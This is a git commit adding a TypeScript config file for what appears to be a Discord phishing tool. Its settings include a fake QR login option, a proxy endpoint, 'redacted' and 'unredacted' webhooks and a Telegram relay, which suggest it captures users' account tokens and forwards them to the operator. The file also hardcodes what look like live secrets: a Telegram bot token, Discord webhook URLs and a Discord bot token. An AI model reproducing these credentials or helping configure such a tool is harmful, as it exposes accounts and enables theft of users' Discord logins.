37e455ab011a02d95d9d997a4ab63773d9a5e13f
wololoaoe123 <139802626+wololoaoe123@users.noreply.github.com>
2023-08-15 11:15:52 +0200

    Add files via upload

---
+++ aaa/config.ts
@@ -0,0 +1,25 @@
+// SERVER DETAILS
+export const domain = 'alextest.deno.dev';
+export const fullDomain = `https://${domain}`;
+export const proxies: string[] = [];
+export const fakeQr = true;
+export const qrCodeEndpoint = 'localhost:8080/proxy';
+export const hostingOnVPS = false;
+
+// TELEGRAM DETAILS
+export const telegramToken = '6529370298:AAF6qOaZBC3TZwj07yOoyYlqs22RDKmdqUU';
+export const telegramChatId = '-923296174';
+
+// DISCORD OAUTH DETAILS
+export const clientID = '';
+export const clientSecret = '';
+export const redirectURI = `${fullDomain}/login`;
+
+// WEBHOOKS
+export const redactedWebhook = 'https://discord.com/api/webhooks/1140923281743040543/NPqVxrYCQmKMsQW6STb4uh-dbtkE5ISPjkJgvkUFJlkY5F08I9Imr9FPmLZDZ3OGx-6U';
+export const unredactedWebhook = 'https://discord.com/api/webhooks/1140923276709863444/Kot4gWK2HuUBXxYLnIbJv7bZSbdK35fDecmfpqupxxnifdYR4voicRs2qxN9a0nRcar-';
+
+// AUTO ROLE
+export const autoRoleToken = 'MTEwMjk2MDE3MzI2NzU1ODQzMA.GgdaRj.mlc0Ws0SVPORvi8XjlYNTsq9_tZnofoOFWLUFE';
+export const autoRoleGuildId = '1091785617177841754';
+export const autoRoleRoleId = '1091803038898978927';
